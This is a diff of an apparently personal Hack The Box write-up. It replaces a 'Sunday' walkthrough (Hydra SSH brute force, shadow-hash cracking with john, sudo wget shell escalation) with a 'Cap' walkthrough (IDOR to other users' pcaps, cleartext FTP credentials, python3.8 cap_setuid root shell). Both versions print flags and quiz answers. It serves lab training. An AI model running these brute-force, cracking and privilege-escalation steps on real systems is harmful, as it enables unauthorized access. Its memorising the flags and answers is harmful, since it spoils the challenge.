@@ -40,14 +40,14 @@ Packet Capture Analysis | Password Reuse | SUID Exploitation
 
 ## Task 0 - Deploy machine
 
-🎯 Target IP: `10.129.237.24`
+🎯 Target IP: `10.10.10.245`
 
 Create a directory on the Desktop with the machine's name, and inside this directory, create another directory to store the materials and outputs needed to run the machine, including the scans made with nmap.
 
 ## Task 1 - Reconnaissance
 
 <pre class="language-bash"><code class="lang-bash">su
-<strong>echo "10.129.237.24 cap.htb" >> /etc/hosts
+<strong>echo "10.10.10.245 cap.htb" >> /etc/hosts
 </strong>
 mkdir -p htb/cap.htb
 cd htb/cap.htb
@@ -61,10 +61,10 @@ I prefer to start recon by pinging the target, this allows us to check connectiv
 
 ```bash
 ping -c 3 cap.htb
-PING cap.htb (10.129.237.24) 56(84) bytes of data.
-64 bytes from cap.htb (10.129.237.24): icmp_seq=6 ttl=63 time=77.8 ms
-64 bytes from cap.htb (10.129.237.24): icmp_seq=9 ttl=63 time=80.1 ms
-64 bytes from cap.htb (10.129.237.24): icmp_seq=11 ttl=63 time=51.5 ms
+PING cap.htb (10.10.10.245) 56(84) bytes of data.
+64 bytes from cap.htb (10.10.10.245): icmp_seq=6 ttl=63 time=77.8 ms
+64 bytes from cap.htb (10.10.10.245): icmp_seq=9 ttl=63 time=80.1 ms
+64 bytes from cap.htb (10.10.10.245): icmp_seq=11 ttl=63 time=51.5 ms
 ```
 
 Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target should be a **\*nix** system, while Windows systems usually have a TTL of 128 secs.
@@ -87,6 +87,10 @@ PORT   STATE SERVICE REASON
 <table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sT</td><td>TCP connect port scan (Default without root privilege)</td></tr><tr><td>sC</td><td>Run default scripts</td></tr><tr><td>sV</td><td>Enumerate versions</td></tr><tr><td>vvv</td><td>Verbosity</td></tr><tr><td>T4</td><td>Run a bit faster</td></tr><tr><td>oN</td><td>Output to file with nmap formatting</td></tr></tbody></table>
 
 It looks like there are 3 open TCP ports on the machine: 21, 22, 80.
+
+{% hint style="info" %}
+3
+{% endhint %}
 
 Then, we can proceed to analyze services active on open ports:
 
@@ -202,203 +206,190 @@ SF:check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Good, to understand the target scope, we can start to checking web server via broswer:
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-Login bypass unfortunaly doesn't work and we don't obtained great info via whatweb.
+Apart from the name of the web server 'Gunicorn' which I already knew we don't get much more information through whatweb.
 
 ```bash
-whatweb sunday.htb:6787
-http://sunday.htb:6787 [400 Bad Request] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[10.129.237.18], Title[400 Bad Request], X-Frame-Options[SAMEORIGIN]
+whatweb cap.htb
+http://cap.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[10.10.10.245], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]
 ```
 
+Then, to understand the target scope, we can start to checking web server via browser:
 
+<div align="left"><figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure></div>
 
+it is a dashboard view regarding security events, failed login attempts and more, going to 'Security Snapshot' we have a counter packet sniffer with the possiblity to download traffic captured.
 
+<div align="left"><figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure></div>
 
+while, selecting 'IP Config' we can see the network interface of attacker machine `10.10.10.245`
 
+<div align="left"><figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure></div>
 
-{% hint style="info" %}
-3
-{% endhint %}
+than, clicking 'Network Status' there's all current connections:
+
+<div align="left"><figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure></div>
+
+finally, the 'user tab' on top-right is only a mockup without functionality, but we'll track this name: 'Nathan', it can be useful for SSH and FTP services.
+
+<div align="left"><figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure></div>
+
+Doing a directory enumeration with GoBuster tool and checking source page we don't discover others useful thing.
+
+```bash
+gobuster dir -u http://cap.htb -w /usr/share/wordlists/dirb/common.txt
+```
+
+<div align="left"><figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure></div>
 
 ### 1.2 - After running a "Security Snapshot", the browser is redirected to a path of the format /\[something]/\[id], where \[id] represents the id number of the scan. What is the \[something]?
 
-### How finger service works?
+This request is a good hint to understand which path to take, so let's try to generate some traffic with ICMP requests, and check if the traffic is captured.
 
-The **Finger** program/service is utilized for retrieving details about computer users. Typically, the information provided includes the **user's login name, full name**, and, in some cases, additional details. These extra details could encompass the office location and phone number (if available), the time the user logged in, the period of inactivity (idle time), the last instance mail was read by the user, and the contents of the user's plan and project files.
+<div align="left"><figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure></div>
 
-{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger" %}
-
-The best way to learn one thing is to improve yourself and develop your own tools, so I did and created the following tool in python that allows us to enumerate the users of the system using a dictionary attack with a common wordlist.
-
-{% embed url="https://github.com/dev-angelist/Finger-User-Enumeration" %}
-
-```bash
-```
-
-excluding the root user, there are two users listed: sammy and sunny.
+Indeed it is, and we can answer the question by displaying the url path.
 
 {% hint style="info" %}
-2
+data
 {% endhint %}
 
-## Task 2 - Find User Flag
+## Task 2 - Exploitation & User Flag
 
-### 2.1 - What is the password for the sunny user on Sunday?
+### 2.1 - Are you able to get to other users' scans?
 
-We can use brute force tool like as Hydra to try to found sunny's password. We can do a tentative via SSH/22022 protocol.
+Trying to use the ffuf tool with a wordlist of the most frequent users, I did not get any results.
 
-```
-hydra -l sunny -P /home/kali/Downloads/probable-v2-top1575.txt -I -f ssh://sunday.htb:22022
+An interesting thing to note in the Security Snapshot is the URL scheme when creating a new capture, which is in the format /data/ . The id is incremented for each capture.
 
-```
+<div align="left"><figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure></div>
 
-<figure><img src="../.gitbook/assets/image (367).png" alt=""><figcaption></figcaption></figure>
+I tried to insert different parameters and I found the presence of the vulnerability Insecure Direct Object Reference (IDOR) is a vulnerability that arises when attackers can access or modify objects by manipulating identifiers used in a web page.
 
-Fantastic, here is our password, which honestly we could have even tried to guess.
+It means that server should stores latest scans and it has been packet captures from users before us. I remember that i started to see /data/1, than browsing to /data/0 does indeed reveal a packet capture with multiple packets.
+
+<div align="left"><figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure></div>
+
+Then, we can state the possibility to get scans of other users answering to the last question.
 
 {% hint style="info" %}
-sunday
+yes
 {% endhint %}
 
-### 2.2 - What is the password for user `sammy` on the box?
+### 2.2 - What is the ID of the PCAP file that contains sensative data?
+
+<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+<div align="left"><figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure></div>
+
+Now, we can open pcap file (that has a reference with machine name) and analyze traffic using Wireshark, and searching ftp, http or others sensitive traffics in cleartext.
+
+<div align="left"><figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure></div>
+
+And here we immediately see a successful connection attempt on the FTP protocol of the previously mentioned user 'Nathan' with the relative password in cleartext.
+
+{% hint style="info" %}
+0
+{% endhint %}
+
+### 2.3 - Which application layer protocol in the pcap file can the sensitive data be found in?
+
+The sensitive data is present in FTP protocol, these below is the complete TCP Stream:
+
+<div align="left"><figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure></div>
+
+Great, now we know the password credentials for FTP service, we will also try it on SSH service.
+
+{% hint style="info" %}
+ftp
+{% endhint %}
+
+### 2.4 - We've managed to collect nathan's FTP password. On what other service does this password work?
+
+Also anticipated, we can test credentials for FTP and SSH services.
+
+#### FTP/21
+
+`ftp nathan@cap.htb`
+
+<div align="left"><figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure></div>
+
+#### SSH/22
+
+<div align="left"><figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure></div>
+
+Great, the credentials work on both services ;)
+
+{% hint style="info" %}
+SSH
+{% endhint %}
+
+2.5 - Submit the flag located in the nathan user's home directory.
+
+We had already seen interesting files in the previous task, let's proceed with viewing the user flag in Nathan's folder.
 
 \
-Using again Hydra we don't obtain results, then we can try to login via ssh into sunny user. &#x20;
-
-```bash
-ssh sunny@sunday.htb -p 22022
-```
-
-Here we find the folders of the two users, but without any valuable information about the password.
-
-In sammy's folder there is the bash history, so let's try to check if there were any passwords written incorrectly in clear text.
-
-```bash
-cat ~/.bash_history | grep "password"
-```
-
-No results.
-
-Fortunately, investigating a bit, we find in the path /backup the file shadow.backup, containing the backup of the file /etc/shadow and therefore of the hashes of the users.&#x20;
-
-<div align="left"><figure><img src="../.gitbook/assets/image (369).png" alt=""><figcaption></figcaption></figure></div>
-
-So we save the sammy's hash and launch john or hashcat to crack it.
-
-```bash
-echo "sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::" >> sammy_hash
-```
-
-```bash
-john sammy_hash --wordlist=/usr/share/wordlists/rockyou.txt
-```
-
-<figure><img src="../.gitbook/assets/image (370).png" alt=""><figcaption></figcaption></figure>
-
-Well done!
-
-{% hint style="info" %}
-cooldude!
-{% endhint %}
-
-### 2.3 -  Submit the flag located in the sammy user's home directory.
-
-Now that we also know sammy's password, we can ssh in and get the flag easily.
-
-```bash
-ssh sammy@sunday.htb -p 22022
-```
-
-```bash
-cat user.txt
-```
+![](<../.gitbook/assets/image (18).png>)
 
 <details>
 
 <summary>🚩 Flag 1 (user.txt)</summary>
 
-db7749ca1b003cf371c1f2afed38f834
+f17ce10e2a6f6da2a5f4d76ebb61c401
 
 </details>
 
-## Task 3 - Find root flag
+## Task 3 - Privilege Escalation & Root Flag
 
-### 3.1 - What is the full path of the binary that user sunny can run with sudo privileges?
+### 3.1 - What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?
 
-Executing `sudo -l` command we can commands that user puma can execute with sudo privileges:
+Executing `sudo -l` command we can't see commands that user Nathan can execute with sudo privileges:
 
-<div align="left"><figure><img src="../.gitbook/assets/image (372).png" alt=""><figcaption></figcaption></figure></div>
+<div align="left"><figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure></div>
 
-{% hint style="info" %}
-/root/troll
-{% endhint %}
-
-### 3.2 - What is the complete path of the binary that user sammy can run with sudo privileges?
-
-Same thing, `sudo -l` command and it's done!
-
-<div align="left"><figure><img src="../.gitbook/assets/image (371).png" alt=""><figcaption></figcaption></figure></div>
-
-{% hint style="info" %}
-/usr/bin/wget
-{% endhint %}
-
-### 3.3 - Submit the flag located in root's home directory.
-
-The previous two tasks are the prelude to privilege escalation, let's checking them!
-
-#### sammy
-
-* /root/troll
-
-Not knowing "troll" which I imagine is an ironic name, we focus on the usual wget.
-
-#### sunny
-
-* /usr/bin/wget
-
-As always, the wget bible has a solution for privilege escalation with sudo.
+Then first to use automated tools like as Linpeas, and remembering the hint of the question, i want to try to execute some useful commands:
 
 ```bash
-TF=$(mktemp)
-chmod +x $TF
-echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
-sudo wget --use-askpass=$TF 0
+crontab -l
+cat /proc/version
+getcap -r /2>/dev/null
 ```
 
-{% embed url="https://gtfobins.github.io/gtfobins/wget/" %}
+<div align="left"><figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure></div>
 
-<div align="left"><figure><img src="../.gitbook/assets/image (374).png" alt=""><figcaption></figcaption></figure></div>
+checking cronjobs, potential kernel version and [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html), we got an interesting output from linux capabilities only, so let's go ahead with that!&#x20;
 
+Analyzing the first string of this output: `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip` we observe the presence of '[cap\_setuid](https://man7.org/linux/man-pages/man2/setuid.2.html)', therefore the capabily to elevate privileges to the python interpreter.&#x20;
+
+<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+/usr/bin/python3.8
+{% endhint %}
+
+### 3.2 - Submit the flag located in root's home directory.
+
+The goal is to set our setuid to 0 (root user), let's proceed.
+
+We can change it directly on victim machine and executing OS commands via python3.8 interpreter: `usr/bin/python3.8`
+
+```python
+import os
+os.setuid(0)
+os.system("/bin/bash")
 ```
-cat /root/root.txt
-```
+
+and after setting uid to 0 we obtain root permission!
+
+<div align="left"><figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure></div>
+
+we complete by heading to the root folder to capture the root.txt flag: `cat /root/root.txt`
 
 <details>
 
 <summary>🚩 Flag 2 (root.txt)</summary>
 
-c4fc01d4944cf3925f079da70abdaea7
+751fab1137897a30e64a45e099f8f9b7
 
 </details>
 
-<figure><img src="../.gitbook/assets/image (373).png" alt=""><figcaption></figcaption></figure>
+<div align="left"><figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure></div>
